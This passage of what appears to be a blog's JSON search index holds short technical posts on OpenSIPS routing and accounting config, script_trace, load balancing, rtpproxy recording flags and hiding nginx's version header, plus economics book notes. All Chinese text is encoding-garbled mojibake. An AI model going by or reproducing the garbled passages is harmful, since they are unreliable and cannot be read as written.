record-routing if (loose_route()) { # mark routing logic in request append_hf(\u0026#34;P-hint: rr-enforced\\r\\n\u0026#34;); if(is_method(\u0026#34;BYE\u0026#34;)) { # account BYE for STOP record setflag(1); } route(1); }; # we record-route all messages -- to make sure that # subsequent messages will go through our proxy; that\u0026#39;s # particularly good if upstream and downstream entities # use different transport protocol if (!is_method(\u0026#34;REGISTER\u0026#34;)) record_route(); # account all calls if(is_method(\u0026#34;INVITE\u0026#34;)) { # set accounting on for INVITE (success or missed call) setflag(1); setflag(2); } if (!is_myself(\u0026#34;$rd\u0026#34;)) { # mark routing logic in request append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); # if you have some interdomain connections via TLS #if($ru=~\u0026#34;@tls_domain1.net\u0026#34;) { #\tt_relay(\u0026#34;tls:domain1.net\u0026#34;); #\texit; #} else if($ru=~\u0026#34;@tls_domain2.net\u0026#34;) { #\tt_relay(\u0026#34;tls:domain2.net\u0026#34;); #\texit; #} route(1); }; # if the request is for other domain use UsrLoc # (in case, it does not work, use the following command # with proper names and addresses in it) if (is_myself(\u0026#34;$rd\u0026#34;)) { if (is_method(\u0026#34;REGISTER\u0026#34;)) { # Uncomment this if you want to use digest authentication #if (!www_authorize(\u0026#34;opensips.org\u0026#34;, \u0026#34;subscriber\u0026#34;)) { #\twww_challenge(\u0026#34;opensips.org\u0026#34;, \u0026#34;0\u0026#34;); #\texit; #}; save(\u0026#34;location\u0026#34;); exit; }; if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound alias\\r\\n\u0026#34;); route(1); }; # native SIP destinations are handled using our USRLOC DB if (!lookup(\u0026#34;location\u0026#34;)) { sl_send_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; }; append_hf(\u0026#34;P-hint: usrloc applied\\r\\n\u0026#34;); }; route(1); } route[1] { # send it out now; use stateful forwarding as it works reliably # even for UDP2TCP if (!t_relay()) { sl_reply_error(); }; exit; } ","permalink":"https://wdd.js.org/opensips/ch8/acc-mysql/","summary":"# # Sample config for MySQL accouting with OpenSIPS # # - db_mysql module must be compiled and installed # # - new columns have to be added since by default only few are recorded # - here are full SQL statements to create acc and missed_calls tables # # CREATE TABLE `acc` ( # `id` int(10) unsigned NOT NULL auto_increment, # `method` varchar(16) NOT NULL default \u0026#39;\u0026#39;, # `from_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `to_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `callid` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `sip_code` char(3) NOT NULL default \u0026#39;\u0026#39;, # `sip_reason` varchar(32) NOT NULL default \u0026#39;\u0026#39;, # `time` datetime NOT NULL default \u0026#39;0000-00-00 00:00:00\u0026#39;, # `src_ip` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `src_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `src_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # INDEX acc_callid (`callid`), # PRIMARY KEY (`id`) # ); # # CREATE TABLE `missed_calls` ( # `id` int(10) unsigned NOT NULL auto_increment, # `method` varchar(16) NOT NULL default \u0026#39;\u0026#39;, # `from_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `to_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `callid` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `sip_code` char(3) NOT NULL default \u0026#39;\u0026#39;, # `sip_reason` varchar(32) NOT NULL default \u0026#39;\u0026#39;, # `time` datetime NOT NULL default \u0026#39;0000-00-00 00:00:00\u0026#39;, # `src_ip` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `src_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `src_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # INDEX acc_callid (`callid`), # PRIMARY KEY (`id`) # ); # # # ----------- global configuration parameters ------------------------ log_level=3 # debug level (cmd line: -dddddddddd) log_stderror=no # (cmd line: -E) /* Uncomment these lines to enter debugging mode */ #debug_mode=yes check_via=no\t# (cmd.","title":"acc-mysql"},{"content":"script_traceæ˜¯æ ¸å¿ƒå‡½æ•°ï¼Œä¸éœ€è¦å¼•å…¥æ¨¡å—ã€‚\nscript_trace([log_level, pv_format_string[, info_string]]) This function start the script tracing - this helps to better understand the flow of execution in the OpenSIPS script, like what function is executed, what line it is, etc. Moreover, you can also trace the values of pseudo-variables, as script execution progresses. The blocks of the script where script tracing is enabled will print a line for each individual action that is done (e.g. assignments, conditional tests, module functions, core functions, etc.). Multiple pseudo-variables can be monitored by specifying a pv_format_string (e.g. \u0026#34;$ru---$avp(var1)\u0026#34;). The logs produced by multiple/different traced regions of your script can be differentiated (tagged) by specifying an additional plain string - info_string - as the 3rd parameter. To disable script tracing, just do script_trace(). Otherwise, the tracing will automatically stop at the end the end of the top route. Example of usage: script_trace( 1, \u0026#34;$rm from $si, ruri=$ru\u0026#34;, \u0026#34;me\u0026#34;); will produce: [line 578][me][module consume_credentials] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 581][me][core setsflag] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 583][me][assign equal] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 592][me][core if] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 585][me][module is_avp_set] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 589][me][core if] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 586][me][module is_method] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 587][me][module trace_dialog] -\u0026gt; (INVITE 127.0.0.1 , ruri=sip:tester@opensips.org) [line 590][me][core setflag] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) ","permalink":"https://wdd.js.org/opensips/ch7/cfg-trace/","summary":"script_traceæ˜¯æ ¸å¿ƒå‡½æ•°ï¼Œä¸éœ€è¦å¼•å…¥æ¨¡å—ã€‚\nscript_trace([log_level, pv_format_string[, info_string]]) This function start the script tracing - this helps to better understand the flow of execution in the OpenSIPS script, like what function is executed, what line it is, etc. Moreover, you can also trace the values of pseudo-variables, as script execution progresses. The blocks of the script where script tracing is enabled will print a line for each individual action that is done (e.g. assignments, conditional tests, module functions, core functions, etc.","title":"script_trace æ‰“å°opensipsçš„è„šæœ¬æ‰§è¡Œè¿‡ç¨‹"},{"content":"ä¹‹å‰è¯»å®Œé±¼ã€ç¾å…ƒå’Œç»æµå­¦çš„æ•…äº‹ç¬¬ä¸€ç‰ˆï¼Œä»¤æˆ‘å°è±¡æ·±åˆ»ã€‚åæ¥kindleä¸Šæœ‰å‡ºç°äº†è¿™æœ¬ä¹¦çš„ç¬¬äºŒç‰ˆï¼Œå†…å®¹å¢åŠ äº†ï¼Œå¹¶ä¸”ä¹Ÿå¢åŠ äº†ä¸€äº›å¥½çœ‹çš„æ’å›¾ã€‚\næˆ‘åº¦è¿‡ä¸å°‘ç»æµå­¦çš„ä¹¦ï¼Œã€Šå›½å¯Œè®ºã€‹æ˜¯æ¯”è¾ƒæ·±å¥¥çš„ä¸€æœ¬ï¼Œæˆ‘åªèƒ½çœ‹æ‡‚å‰é¢ä¸€ä¸¤ç« ï¼Œå°±è¯»ä¸ä¸‹å»äº†ã€‚\nä½†æ˜¯å°å²›ç»æµå­¦çš„è¿™æœ¬ä¹¦ï¼ŒçœŸçš„æŠŠç»æµå­¦é‡Œéš¾ä»¥ç†è§£çš„ä¸œè¥¿è¯´çš„é€šä¿—æ˜“æ‡‚ã€‚\nä¹Ÿè®¸ç»æµå­¦æœ¬æ¥å¹¶ä¸æ˜¯é‚£ä¹ˆéš¾ä»¥ç†è§£ï¼Œåªæ˜¯ä¸“å®¶æ…¢æ…¢å˜å¤šäº†ï¼Œä»–ä»¬å°±æŠŠç»æµå­¦å˜å¾—éš¾ä»¥ç†è§£äº†ã€‚å› ä¸ºåªæœ‰è¿™æ ·ï¼Œæ‰èƒ½æ˜¾å¾—ä»–ä»¬æ˜¯å¤šä¹ˆçš„å¯Œæœ‰èªæ˜æ‰æ™ºã€‚\n1. è‡ªå·±çš„ç”Ÿæ„ æ¯ä¸ªäººå®é™…ä¸Šéƒ½åœ¨ç»è¥è‡ªå·±çš„ç”Ÿæ„ï¼Œå°†è‡ªå·±çš„åŠ³åŠ¨åŠ›å–ç»™å‡ºä»·æœ€é«˜çš„è€æ¿ã€‚\n2. å‘˜å·¥çš„ä»·å€¼ å‘˜å·¥çš„ä»·å€¼ä¸»è¦å–å†³äºä¸‰ä¸ªæ–¹é¢ï¼š\néœ€æ±‚ï¼ˆè€æ¿æ˜¯å¦éœ€è¦å‘˜å·¥æ‰€æŒæ¡çš„æŠ€èƒ½ï¼‰ ä¾›åº”ï¼ˆæœ‰å¤šå°‘äººå…·å¤‡è¿™äº›æŠ€èƒ½ï¼‰ ç”Ÿäº§åŠ›ï¼ˆå‘˜å·¥å¯¹é‚£äº›å·¥ä½œå®Œæˆçš„ç¨‹åº¦å¦‚ä½•ï¼‰ æ‰€ä»¥ï¼Œä½ çš„ä»·å€¼å¹¶ä¸ä¼šå› ä¸ºä½ åƒè‹¦è€åŠ³è€Œå‡é«˜ã€‚\n3. çº½çº¦åœ°é“ çº½çº¦çš„åœ°å€ç”±ç§è¥å…¬å¸å»ºè®¾ï¼Œ40å¹´å†…éƒ½æ˜¯ç”±ç§è¥å…¬å¸è´Ÿè´£è¿è¥ã€‚è™½ç„¶åœ°é“é€ ä»·ä¸è²ï¼Œä½†æ˜¯è¿˜æ˜¯å®ç°äº†ç›ˆåˆ©ã€‚æ›´å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ40å¹´é‡Œè½¦ç¥¨çš„ä»·æ ¼ä»æœªä¸Šæ¶¨ã€‚\nè¿™æ˜¯å€¼å¾—æ·±æ€çš„åœ°æ–¹ï¼Œæœ‰äº›å…¬å…±äº‹æƒ…ï¼Œç§è¥å…¬å¸æ¥åšå¯èƒ½è¦æ¯”æ”¿åºœåšçš„æ›´å¥½ã€æ•ˆç‡æ›´é«˜ã€‚\næ”¿åºœå¯¹å…¬å…±è®¾æ–½çš„å„æ–­ï¼Œå¾ˆå¤§çš„å¯èƒ½ä¼šé€ æˆæ•ˆç‡ä½ä¸‹å’Œè´ªæ±¡è…è´¥ã€‚\n4. ç»æµçš„ç›®çš„ æä¾›å°±ä¸šå²—ä½å¹¶ä¸æ˜¯ç»æµçš„ç›®çš„ï¼Œç»æµçš„ç›®çš„æ˜¯ä¸æ–­æé«˜ç”Ÿäº§åŠ›ã€‚\n5. è†¨èƒ€ä¸ç´§ç¼© é€šè´§è†¨èƒ€å°±æ˜¯è´§å¸çš„ä¾›ç»™å¢åŠ ï¼Œç›¸åçš„å°±æ˜¯é€šè´§ç´§ç¼©ã€‚ä»·æ ¼å¹¶ä¸ä¼šè†¨èƒ€æˆ–è€…ç´§ç¼©ï¼Œä»·æ ¼åªèƒ½ä¸Šæ¶¨æˆ–è€…ä¸‹è·Œã€‚è†¨èƒ€çš„ä¸æ˜¯ä»·æ ¼ï¼Œè€Œæ˜¯è´§å¸ä¾›ç»™ã€‚\n6. è°éœ€è¦ä½ çš„è´§å¸ï¼Ÿ å¦‚æœæ²¡æœ‰äººæƒ³è´­ä¹°ä½ çš„äº§å“ï¼Œä¹Ÿå°±æ²¡æœ‰äººéœ€è¦ä½ çš„è´§å¸ã€‚\nç¾å›½çš„å¾ˆå¤šäº§å“åœ¨å…¨ä¸–ç•Œéƒ½å¾ˆåƒé¦™ï¼Œæ‰€ä»¥ç¾å…ƒæ˜¯å¾ˆå¤šå›½å®¶éƒ½éœ€è¦çš„ã€‚\n7. äººä»¬ä¸ºä½•æ¶ˆè´¹ï¼Ÿ ç»æµå¹¶ä¸ä¼šå› ä¸ºäººä»¬çš„æ¶ˆè´¹è€Œå¢é•¿ï¼Œè€Œæ˜¯ç»æµå¢é•¿ä¼šè‡ªç„¶çš„å¸¦åŠ¨äººä»¬çš„æ¶ˆè´¹ã€‚\nä½†æ˜¯ç›®å‰çœ‹æ¥ï¼Œçœ¼ä¸‹æœ€ä¸ºç«çˆ†çš„å°±æ˜¯â€œå¸¦è´§â€è¿™ä¸ªè¯ï¼Œå„ç§äººç‰©ï¼Œæ— è®ºæ˜¯å…¬ä¼—æ˜æ˜Ÿè¿˜æ˜¯æ™®é€šäººï¼Œéƒ½æƒ³æ¥æå¸¦è´§ã€‚\nå„ç§æ–°é—»æŠ¥é“ä¹Ÿåœ¨å¤§è‚†å®£æ‰¬ï¼ŒæŸæŸæ˜æ˜Ÿç›´æ’­å¸¦è´§xxxäº¿å…ƒã€‚\nå½“ä½ è¢«xxxäº¿å…ƒå¸å¼•æ—¶ï¼Œä½ æ˜¯å¦ä¹Ÿæ›¾æš—æš—æ€è€ƒè¿‡ï¼Œè¿™äº›é’±æ¥è‡ªå“ªé‡Œï¼Ÿ ä¹°è¿™äº›ä¸œè¥¿å¯¹äºæ¶ˆè´¹è€…æ¥è¯´ï¼Œåˆæœ‰ä»€ä¹ˆå¥½å¤„ã€‚\nåœ¨ç»æµä»¥ä¸ºç–«æƒ…çš„å½±å“å’Œä¸‹è¡Œæ—¶ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰é‚£ä¹ˆå¤šäººç–¯ç‹‚è´­ç‰©å‘¢ï¼Ÿ\nå¤©ä¸‹çš†çŸ¥ç¾ä¹‹ä¸ºç¾ï¼Œæ–¯æ¶å·²ã€‚æˆ‘æƒ³è¿™ç§å¸¦è´§çš„æ¨¡å¼ï¼Œä¹Ÿè®¸å°±å¿«è¦åˆ°å°½å¤´äº†ã€‚\n8. é‡åŒ–å®½æ¾ åŒ—äº¬çš„ç™½èœï¼ˆä¸€åˆ°ï¼‰æµ™æ±Ÿ,ä¾¿ç”¨çº¢å¤´ç»³ç³»ä½èœæ ¹,å€’æŒ‚åœ¨æ°´æœåº—å¤´,å°Šä¸ºâ€œèƒ¶èœâ€ï¼›ç¦å»ºé‡ç”Ÿç€çš„èŠ¦èŸ,ï¼ˆè¿å¾€ï¼‰åŒ—äº¬å°±è¯·è¿›æ¸©å®¤,ä¸”ç¾å…¶åæ›°â€œé¾™èˆŒå…°â€. ã€Šè—¤é‡å…ˆç”Ÿã€‹é²è¿…\næ˜æ˜ç™½ç™½çš„é€šè´§è†¨èƒ€ï¼Œåˆ°äº†ç»æµå­¦å®¶å’Œæ”¿å®¢çš„å˜´é‡Œï¼Œç¾å…¶åæ›°â€œé‡åŒ–å®½æ¾â€ã€‚\n","permalink":"https://wdd.js.org/posts/2020/05/kn7c4e/","summary":"ä¹‹å‰è¯»å®Œé±¼ã€ç¾å…ƒå’Œç»æµå­¦çš„æ•…äº‹ç¬¬ä¸€ç‰ˆï¼Œä»¤æˆ‘å°è±¡æ·±åˆ»ã€‚åæ¥kindleä¸Šæœ‰å‡ºç°äº†è¿™æœ¬ä¹¦çš„ç¬¬äºŒç‰ˆï¼Œå†…å®¹å¢åŠ äº†ï¼Œå¹¶ä¸”ä¹Ÿå¢åŠ äº†ä¸€äº›å¥½çœ‹çš„æ’å›¾ã€‚\næˆ‘åº¦è¿‡ä¸å°‘ç»æµå­¦çš„ä¹¦ï¼Œã€Šå›½å¯Œè®ºã€‹æ˜¯æ¯”è¾ƒæ·±å¥¥çš„ä¸€æœ¬ï¼Œæˆ‘åªèƒ½çœ‹æ‡‚å‰é¢ä¸€ä¸¤ç« ï¼Œå°±è¯»ä¸ä¸‹å»äº†ã€‚\nä½†æ˜¯å°å²›ç»æµå­¦çš„è¿™æœ¬ä¹¦ï¼ŒçœŸçš„æŠŠç»æµå­¦é‡Œéš¾ä»¥ç†è§£çš„ä¸œè¥¿è¯´çš„é€šä¿—æ˜“æ‡‚ã€‚\nä¹Ÿè®¸ç»æµå­¦æœ¬æ¥å¹¶ä¸æ˜¯é‚£ä¹ˆéš¾ä»¥ç†è§£ï¼Œåªæ˜¯ä¸“å®¶æ…¢æ…¢å˜å¤šäº†ï¼Œä»–ä»¬å°±æŠŠç»æµå­¦å˜å¾—éš¾ä»¥ç†è§£äº†ã€‚å› ä¸ºåªæœ‰è¿™æ ·ï¼Œæ‰èƒ½æ˜¾å¾—ä»–ä»¬æ˜¯å¤šä¹ˆçš„å¯Œæœ‰èªæ˜æ‰æ™ºã€‚\n1. è‡ªå·±çš„ç”Ÿæ„ æ¯ä¸ªäººå®é™…ä¸Šéƒ½åœ¨ç»è¥è‡ªå·±çš„ç”Ÿæ„ï¼Œå°†è‡ªå·±çš„åŠ³åŠ¨åŠ›å–ç»™å‡ºä»·æœ€é«˜çš„è€æ¿ã€‚\n2. å‘˜å·¥çš„ä»·å€¼ å‘˜å·¥çš„ä»·å€¼ä¸»è¦å–å†³äºä¸‰ä¸ªæ–¹é¢ï¼š\néœ€æ±‚ï¼ˆè€æ¿æ˜¯å¦éœ€è¦å‘˜å·¥æ‰€æŒæ¡çš„æŠ€èƒ½ï¼‰ ä¾›åº”ï¼ˆæœ‰å¤šå°‘äººå…·å¤‡è¿™äº›æŠ€èƒ½ï¼‰ ç”Ÿäº§åŠ›ï¼ˆå‘˜å·¥å¯¹é‚£äº›å·¥ä½œå®Œæˆçš„ç¨‹åº¦å¦‚ä½•ï¼‰ æ‰€ä»¥ï¼Œä½ çš„ä»·å€¼å¹¶ä¸ä¼šå› ä¸ºä½ åƒè‹¦è€åŠ³è€Œå‡é«˜ã€‚\n3. çº½çº¦åœ°é“ çº½çº¦çš„åœ°å€ç”±ç§è¥å…¬å¸å»ºè®¾ï¼Œ40å¹´å†…éƒ½æ˜¯ç”±ç§è¥å…¬å¸è´Ÿè´£è¿è¥ã€‚è™½ç„¶åœ°é“é€ ä»·ä¸è²ï¼Œä½†æ˜¯è¿˜æ˜¯å®ç°äº†ç›ˆåˆ©ã€‚æ›´å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ40å¹´é‡Œè½¦ç¥¨çš„ä»·æ ¼ä»æœªä¸Šæ¶¨ã€‚\nè¿™æ˜¯å€¼å¾—æ·±æ€çš„åœ°æ–¹ï¼Œæœ‰äº›å…¬å…±äº‹æƒ…ï¼Œç§è¥å…¬å¸æ¥åšå¯èƒ½è¦æ¯”æ”¿åºœåšçš„æ›´å¥½ã€æ•ˆç‡æ›´é«˜ã€‚\næ”¿åºœå¯¹å…¬å…±è®¾æ–½çš„å„æ–­ï¼Œå¾ˆå¤§çš„å¯èƒ½ä¼šé€ æˆæ•ˆç‡ä½ä¸‹å’Œè´ªæ±¡è…è´¥ã€‚\n4. ç»æµçš„ç›®çš„ æä¾›å°±ä¸šå²—ä½å¹¶ä¸æ˜¯ç»æµçš„ç›®çš„ï¼Œç»æµçš„ç›®çš„æ˜¯ä¸æ–­æé«˜ç”Ÿäº§åŠ›ã€‚\n5. è†¨èƒ€ä¸ç´§ç¼© é€šè´§è†¨èƒ€å°±æ˜¯è´§å¸çš„ä¾›ç»™å¢åŠ ï¼Œç›¸åçš„å°±æ˜¯é€šè´§ç´§ç¼©ã€‚ä»·æ ¼å¹¶ä¸ä¼šè†¨èƒ€æˆ–è€…ç´§ç¼©ï¼Œä»·æ ¼åªèƒ½ä¸Šæ¶¨æˆ–è€…ä¸‹è·Œã€‚è†¨èƒ€çš„ä¸æ˜¯ä»·æ ¼ï¼Œè€Œæ˜¯è´§å¸ä¾›ç»™ã€‚\n6. è°éœ€è¦ä½ çš„è´§å¸ï¼Ÿ å¦‚æœæ²¡æœ‰äººæƒ³è´­ä¹°ä½ çš„äº§å“ï¼Œä¹Ÿå°±æ²¡æœ‰äººéœ€è¦ä½ çš„è´§å¸ã€‚\nç¾å›½çš„å¾ˆå¤šäº§å“åœ¨å…¨ä¸–ç•Œéƒ½å¾ˆåƒé¦™ï¼Œæ‰€ä»¥ç¾å…ƒæ˜¯å¾ˆå¤šå›½å®¶éƒ½éœ€è¦çš„ã€‚\n7. äººä»¬ä¸ºä½•æ¶ˆè´¹ï¼Ÿ ç»æµå¹¶ä¸ä¼šå› ä¸ºäººä»¬çš„æ¶ˆè´¹è€Œå¢é•¿ï¼Œè€Œæ˜¯ç»æµå¢é•¿ä¼šè‡ªç„¶çš„å¸¦åŠ¨äººä»¬çš„æ¶ˆè´¹ã€‚\nä½†æ˜¯ç›®å‰çœ‹æ¥ï¼Œçœ¼ä¸‹æœ€ä¸ºç«çˆ†çš„å°±æ˜¯â€œå¸¦è´§â€è¿™ä¸ªè¯ï¼Œå„ç§äººç‰©ï¼Œæ— è®ºæ˜¯å…¬ä¼—æ˜æ˜Ÿè¿˜æ˜¯æ™®é€šäººï¼Œéƒ½æƒ³æ¥æå¸¦è´§ã€‚\nå„ç§æ–°é—»æŠ¥é“ä¹Ÿåœ¨å¤§è‚†å®£æ‰¬ï¼ŒæŸæŸæ˜æ˜Ÿç›´æ’­å¸¦è´§xxxäº¿å…ƒã€‚\nå½“ä½ è¢«xxxäº¿å…ƒå¸å¼•æ—¶ï¼Œä½ æ˜¯å¦ä¹Ÿæ›¾æš—æš—æ€è€ƒè¿‡ï¼Œè¿™äº›é’±æ¥è‡ªå“ªé‡Œï¼Ÿ ä¹°è¿™äº›ä¸œè¥¿å¯¹äºæ¶ˆè´¹è€…æ¥è¯´ï¼Œåˆæœ‰ä»€ä¹ˆå¥½å¤„ã€‚\nåœ¨ç»æµä»¥ä¸ºç–«æƒ…çš„å½±å“å’Œä¸‹è¡Œæ—¶ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰é‚£ä¹ˆå¤šäººç–¯ç‹‚è´­ç‰©å‘¢ï¼Ÿ\nå¤©ä¸‹çš†çŸ¥ç¾ä¹‹ä¸ºç¾ï¼Œæ–¯æ¶å·²ã€‚æˆ‘æƒ³è¿™ç§å¸¦è´§çš„æ¨¡å¼ï¼Œä¹Ÿè®¸å°±å¿«è¦åˆ°å°½å¤´äº†ã€‚\n8. é‡åŒ–å®½æ¾ åŒ—äº¬çš„ç™½èœï¼ˆä¸€åˆ°ï¼‰æµ™æ±Ÿ,ä¾¿ç”¨çº¢å¤´ç»³ç³»ä½èœæ ¹,å€’æŒ‚åœ¨æ°´æœåº—å¤´,å°Šä¸ºâ€œèƒ¶èœâ€ï¼›ç¦å»ºé‡ç”Ÿç€çš„èŠ¦èŸ,ï¼ˆè¿å¾€ï¼‰åŒ—äº¬å°±è¯·è¿›æ¸©å®¤,ä¸”ç¾å…¶åæ›°â€œé¾™èˆŒå…°â€. ã€Šè—¤é‡å…ˆç”Ÿã€‹é²è¿…\næ˜æ˜ç™½ç™½çš„é€šè´§è†¨èƒ€ï¼Œåˆ°äº†ç»æµå­¦å®¶å’Œæ”¿å®¢çš„å˜´é‡Œï¼Œç¾å…¶åæ›°â€œé‡åŒ–å®½æ¾â€ã€‚","title":"å°å²›ç»æµå­¦: é±¼ã€ç¾å…ƒå’Œç»æµçš„æ•…äº‹"},{"content":"-.slice\nç”¨ \u0026ndash; è¡¨ç¤ºå‚æ•°å·²ç»ç»“æŸ\ncat \u0026ndash; -.slicevim \u0026ndash; -.slice\n","permalink":"https://wdd.js.org/posts/2020/05/ei2y93/","summary":"-.slice\nç”¨ \u0026ndash; è¡¨ç¤ºå‚æ•°å·²ç»ç»“æŸ\ncat \u0026ndash; -.slicevim \u0026ndash; -.slice","title":"æ–‡ä»¶åä»¥-å¼€å¤´"},{"content":" è´Ÿè½½å‡è¡¡åªèƒ½å‡è¡¡INVITE, ä¸èƒ½å‡è¡¡REGISTERè¯·æ±‚ã€‚å› ä¸ºload_blanceåº•å±‚æ˜¯ä½¿ç”¨dialogæ¨¡å—å»è·Ÿè¸ªç›®æ ‡åœ°å€çš„è´Ÿè½½æƒ…å†µã€‚ load_balanceæ–¹æ³•ä¼šæ”¹å˜INVITEçš„$du,Â è€Œä¸ä¼šä¿®æ”¹SIP URL å‘¼å«ç»“æŸçš„æ—¶å€™ï¼Œç›®æ ‡åœ°å€çš„è´Ÿè½½ä¼šè‡ªåŠ¨é‡Šæ”¾ é€‰æ‹©é€»è¾‘ ç½‘å…³A ç½‘å…³B é€šé“æ•° 30 60 æ­£åœ¨ä½¿ç”¨çš„é€šé“æ•° 20 55 ç©ºé—²é€šé“æ•° 10 5 load_balanceæ˜¯ä¼šå…ˆé€‰æ‹©æœ€å¤§å¯ç”¨èµ„æºçš„ç›®æ ‡åœ°å€ã€‚å‡å¦‚Aç½‘å…³çš„æœ€å¤§å¹¶å‘å‘¼å«æ˜¯30ï¼Œ Bç½‘å…³æœ€å¤§å¹¶å‘å‘¼å«æ˜¯60ã€‚åœ¨æŸä¸ªæ—¶åˆ»ï¼ŒAç½‘å…³ä¸Šå·²ç»æœ‰20å’Œå‘¼å«äº†, Bç½‘å…³ä¸Šå·²ç»æœ‰55ä¸ªå‘¼å«ã€‚ æ­¤æ—¶load_balanceä¼šä¼˜å…ˆé€‰æ‹©ç½‘å…³Aã€‚\nå‚è€ƒ https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9 ","permalink":"https://wdd.js.org/opensips/ch6/load-balance/","summary":" è´Ÿè½½å‡è¡¡åªèƒ½å‡è¡¡INVITE, ä¸èƒ½å‡è¡¡REGISTERè¯·æ±‚ã€‚å› ä¸ºload_blanceåº•å±‚æ˜¯ä½¿ç”¨dialogæ¨¡å—å»è·Ÿè¸ªç›®æ ‡åœ°å€çš„è´Ÿè½½æƒ…å†µã€‚ load_balanceæ–¹æ³•ä¼šæ”¹å˜INVITEçš„$du,Â è€Œä¸ä¼šä¿®æ”¹SIP URL å‘¼å«ç»“æŸçš„æ—¶å€™ï¼Œç›®æ ‡åœ°å€çš„è´Ÿè½½ä¼šè‡ªåŠ¨é‡Šæ”¾ é€‰æ‹©é€»è¾‘ ç½‘å…³A ç½‘å…³B é€šé“æ•° 30 60 æ­£åœ¨ä½¿ç”¨çš„é€šé“æ•° 20 55 ç©ºé—²é€šé“æ•° 10 5 load_balanceæ˜¯ä¼šå…ˆé€‰æ‹©æœ€å¤§å¯ç”¨èµ„æºçš„ç›®æ ‡åœ°å€ã€‚å‡å¦‚Aç½‘å…³çš„æœ€å¤§å¹¶å‘å‘¼å«æ˜¯30ï¼Œ Bç½‘å…³æœ€å¤§å¹¶å‘å‘¼å«æ˜¯60ã€‚åœ¨æŸä¸ªæ—¶åˆ»ï¼ŒAç½‘å…³ä¸Šå·²ç»æœ‰20å’Œå‘¼å«äº†, Bç½‘å…³ä¸Šå·²ç»æœ‰55ä¸ªå‘¼å«ã€‚ æ­¤æ—¶load_balanceä¼šä¼˜å…ˆé€‰æ‹©ç½‘å…³Aã€‚\nå‚è€ƒ https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9 ","title":"è´Ÿè½½å‡è¡¡æ¨¡å—load_balance"},{"content":"-a -R -r /recording -S spool -P -a æ‰€æœ‰çš„é€šè¯éƒ½å½•éŸ³ -R ä¸è¦æŠŠRTCPä¹Ÿå†™æ–‡ä»¶ -rÂ æŒ‡å®šå½•éŸ³æ–‡ä»¶çš„ä½ç½® -S ä¸´æ—¶æ–‡ä»¶çš„ä½ç½®ï¼Œæ³¨æ„ä¸è¦å’Œå½•éŸ³æ–‡ä»¶ä½ç½®ç›¸åŒ -P å½•æˆpcapæ–‡ä»¶çš„æ ¼å¼ï¼Œè€Œä¸è¦å½•æˆé»˜è®¤çš„ Ad-hocçš„æ¨¡å¼ ","permalink":"https://wdd.js.org/opensips/ch4/rtp-record/","summary":"-a -R -r /recording -S spool -P -a æ‰€æœ‰çš„é€šè¯éƒ½å½•éŸ³ -R ä¸è¦æŠŠRTCPä¹Ÿå†™æ–‡ä»¶ -rÂ æŒ‡å®šå½•éŸ³æ–‡ä»¶çš„ä½ç½® -S ä¸´æ—¶æ–‡ä»¶çš„ä½ç½®ï¼Œæ³¨æ„ä¸è¦å’Œå½•éŸ³æ–‡ä»¶ä½ç½®ç›¸åŒ -P å½•æˆpcapæ–‡ä»¶çš„æ ¼å¼ï¼Œè€Œä¸è¦å½•æˆé»˜è®¤çš„ Ad-hocçš„æ¨¡å¼ ","title":"rtpproxyå½•éŸ³"},{"content":"éšè—ç‰ˆæœ¬å· nginxä¼šåœ¨å“åº”å¤´ä¸Šæ·»åŠ å¦‚ä¸‹çš„å¤´ã€‚\nServer: nginx/1.17.9 å¦‚æœä¸æƒ³åœ¨Serveréƒ¨åˆ†æ˜¾ç¤ºå‡ºnginxçš„ç‰ˆæœ¬å·ï¼Œéœ€è¦åœ¨nginx.confçš„http{}éƒ¨åˆ†è®¾ç½®\nhttp { server_tokens off; } ç„¶åé‡å¯nginx, nginxçš„å“åº”å¤´å°±ä¼šå˜æˆã€‚\nServer: nginx ","permalink":"https://wdd.js.org/posts/2020/05/es9hvu/","summary":"éšè—ç‰ˆæœ¬å· nginxä¼šåœ¨å“åº”å¤´ä¸Šæ·»åŠ å¦‚ä¸‹çš„å¤´ã€‚\nServer: nginx/1.17.9 å¦‚æœä¸æƒ³åœ¨Serveréƒ¨åˆ†æ˜¾ç¤ºå‡ºnginxçš„ç‰ˆæœ¬å·ï¼Œéœ€è¦åœ¨nginx.confçš„http{}éƒ¨åˆ†è®¾ç½®\nhttp { server_tokens off; } ç„¶åé‡å¯nginx, nginxçš„å“åº”å¤´å°±ä¼šå˜æˆã€‚\nServer: nginx ","title":"nginx 